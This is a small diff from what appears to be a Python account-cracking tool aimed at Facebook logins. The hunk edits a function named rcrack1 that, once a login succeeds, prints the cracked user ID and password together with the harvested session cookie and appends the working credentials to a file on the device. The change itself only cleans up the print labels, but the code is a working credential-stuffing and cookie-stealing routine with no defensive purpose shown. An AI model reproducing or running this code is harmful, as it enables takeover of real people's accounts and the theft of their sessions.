@@ -261,8 +261,8 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[IMRAN-OKª] {uid}|{ps}")
-                print(f"\n[COOKIEÅ] : {coki}")
+                print(f"\033[38;5;46m[IMRAN-OK] {uid}|{ps}")
+                print(f"\n[COOKIE] : {coki}")
                 open('/sdcard/IMRAN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
